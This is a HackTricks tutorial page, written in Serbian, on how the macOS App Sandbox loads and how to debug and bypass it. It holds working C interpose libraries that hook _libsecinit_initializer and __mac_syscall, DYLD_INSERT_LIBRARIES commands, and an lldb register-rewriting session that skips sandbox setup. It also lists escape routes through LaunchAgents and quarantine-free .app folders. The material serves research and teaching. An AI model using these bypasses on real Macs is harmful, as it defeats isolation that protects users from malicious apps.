# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Proces učitavanja Sandbox-a

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Slika sa <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na prethodnoj slici je moguće videti **kako će se učitati sandbox** kada se pokrene aplikacija sa privilegijom **`com.apple.security.app-sandbox`**.

Kompajler će povezati `/usr/lib/libSystem.B.dylib` sa binarnom datotekom.

Zatim, **`libSystem.B`** će pozivati druge funkcije sve dok **`xpc_pipe_routine`** ne pošalje privilegije aplikacije **`securityd`**-u. Securityd proverava da li bi proces trebalo da bude karantinovan unutar Sandbox-a, i ako je tako, biće karantinovan.\
Na kraju, sandbox će biti aktiviran pozivom funkcije **`__sandbox_ms`** koja će pozvati **`__mac_syscall`**.

## Mogući zaobilaženja

### Zaobilaženje karantin atributa

**Datoteke kreirane od strane procesa u Sandbox-u** dobijaju **karantin atribut** kako bi se sprečilo izlazak iz Sandbox-a. Međutim, ako uspete da **kreirate `.app` folder bez karantin atributa** unutar aplikacije u Sandbox-u, možete postaviti binarnu datoteku aplikacije da pokazuje na **`/bin/bash`** i dodati neke okružne promenljive u **plist** datoteku kako biste zloupotrebili funkcionalnost **`open`** i **pokrenuli novu aplikaciju bez Sandbox-a**.

To je urađeno u [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Stoga, trenutno, ako ste u mogućnosti samo da kreirate folder sa imenom koje se završava na **`.app`** bez karantin atributa, možete zaobići Sandbox jer macOS samo **proverava** karantin atribut u **`.app` folderu** i u **glavnoj izvršnoj datoteci** (i mi ćemo postaviti glavnu izvršnu datoteku na **`/bin/bash`**).

Imajte na umu da ako je .app paket već autorizovan za pokretanje (ima karantin xttr sa zastavicom za autorizovano pokretanje), takođe ga možete zloupotrebiti... osim što sada ne možete pisati unutar **`.app`** paketa osim ako nemate neke privilegovane TCC dozvole (koje nećete imati unutar visokog Sandbox-a).
{% endhint %}

### Zloupotreba funkcionalnosti Open

U [**poslednjim primerima zaobilaženja Word Sandbox-a**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) može se primetiti kako se funkcionalnost **`open`** može zloupotrebiti za zaobilaženje Sandbox-a.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Launch Agenti/Demoni

Čak i ako je aplikacija **namenjena za Sandbox** (`com.apple.security.app-sandbox`), moguće je zaobići Sandbox ako se **izvršava iz LaunchAgent-a** (`~/Library/LaunchAgents`), na primer.\
Kao što je objašnjeno u [**ovom postu**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ako želite da postignete postojanost sa aplikacijom koja je u Sandbox-u, možete je automatski izvršiti kao LaunchAgent i možda ubaciti zlonamerni kod putem DyLib okružnih promenljivih.

### Zloupotreba lokacija automatskog pokretanja

Ako proces u Sandbox-u može **pisati** na mestu gde će **kasnije biti pokrenuta binarna datoteka bez Sandbox-a**, moći će da **izađe iz Sandbox-a** tako što će tamo postaviti binarnu datoteku. Dobar primer ovakvih lokacija su `~/Library/LaunchAgents` ili `/System/Library/LaunchDaemons`.

Za ovo vam može biti potrebno čak **2 koraka**: Da napravite proces sa **više dozvola Sandbox-a** (`file-read*`, `file-write*`) koji će izvršiti vaš kod koji će zapravo pisati na mestu gde će biti **izvršen bez Sandbox-a**.

Pogledajte ovu stranicu o **lokacijama automatskog pokretanja**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Zloupotreba drugih procesa

Ako iz Sandbox procesa uspete da **ugrozite druge procese** koji se izvršavaju u manje restriktivnim Sandbox-ima (ili bez Sandbox-a), moći ćete da pobegnete u njihove Sandbox-e:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Statičko kompajliranje i dinamičko povezivanje

[**Ovo istraživanje**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) je otkrilo 2 načina zaobilaženja Sandbox-a. Budući da se Sandbox primenjuje iz userland-a kada se učita biblioteka **libSystem**. Ako bi binarna datoteka mogla izbeći njeno učitavanje, nikada ne bi bila stavljena u Sandbox:

* Ako je binarna datoteka **potpuno statički kompajlirana**, mogla bi izbeći učitavanje te biblioteke.
* Ako binarna datoteka ne bi trebala da učitava bilo koje biblioteke (jer je i linkera u libSystem), neće morati da učitava libSystem.

### Shell kodovi

Imajte na umu da **čak i shell kodovi** na ARM64 moraju biti povezani sa `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Ovlašćenja

Imajte na umu da čak i ako su neke **radnje** dozvoljene u **pesku**, ako aplikacija ima određeno **ovlašćenje**, kao što je:

```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```

### Interpost Bypass

Za više informacija o **Interpostingu** pogledajte:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpostujte `_libsecinit_initializer` da biste sprečili sandbox.

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interpost `__mac_syscall` da biste sprečili Sandbox

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Debugiranje i zaobilaženje Sandbox-a pomoću lldb-a

Kompajlirajmo aplikaciju koja bi trebala biti sandboxirana:

{% tabs %}
{% tab title="undefined" %}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{% endtab %}

{% tab title="entitlements.xml" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

## Info.plist

Info.plist je XML datoteka koja sadrži informacije o aplikaciji na macOS platformi. Ova datoteka se koristi za konfigurisanje različitih aspekata aplikacije, uključujući i postavke sandboxa.

U kontekstu sandboxa, Info.plist se koristi za definisanje dozvola koje aplikacija ima unutar sandbox okruženja. Ove dozvole određuju koje resurse aplikacija može pristupiti i koje operacije može izvršiti.

Kada se aplikacija pokrene u sandbox okruženju, macOS koristi Info.plist datoteku da bi odredio koje resurse aplikacija može koristiti. Ako aplikacija pokuša pristupiti resursima koji nisu dozvoljeni u Info.plist datoteci, macOS će sprečiti pristup i aplikacija će biti ograničena na dozvoljene operacije.

Info.plist datoteka se nalazi unutar aplikacijskog paketa i može se uređivati pomoću tekstualnog uređivača ili alata za uređivanje XML-a. Prilikom uređivanja Info.plist datoteke, važno je pažljivo proveriti i ažurirati dozvole kako bi se osiguralo da aplikacija ima samo neophodne privilegije unutar sandbox okruženja.

Uz to, Info.plist datoteka može sadržati i druge informacije o aplikaciji, kao što su verzija, identifikator paketa, ikona aplikacije i drugi metapodaci.

***

**Napomena**: Info.plist datoteka je važan deo konfiguracije aplikacije u sandbox okruženju. Uredjivanje ove datoteke može imati značajan uticaj na sigurnost i funkcionalnost aplikacije, stoga je važno biti pažljiv prilikom izmena.

```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Zatim kompajlirajte aplikaciju:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
Aplikacija će pokušati **pročitati** datoteku **`~/Desktop/del.txt`**, što **Sandbox neće dozvoliti**.\
Kreirajte datoteku tamo jer će, jednom kada se Sandbox zaobiđe, moći je pročitati:

```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Hajde da debagujemo aplikaciju da vidimo kada se učitava Sandbox:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

{% hint style="warning" %}
**Čak i kada je Sandbox zaobiđen, TCC** će pitati korisnika da li želi da dozvoli procesu čitanje fajlova sa desktopa.
{% endhint %}

## Reference

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
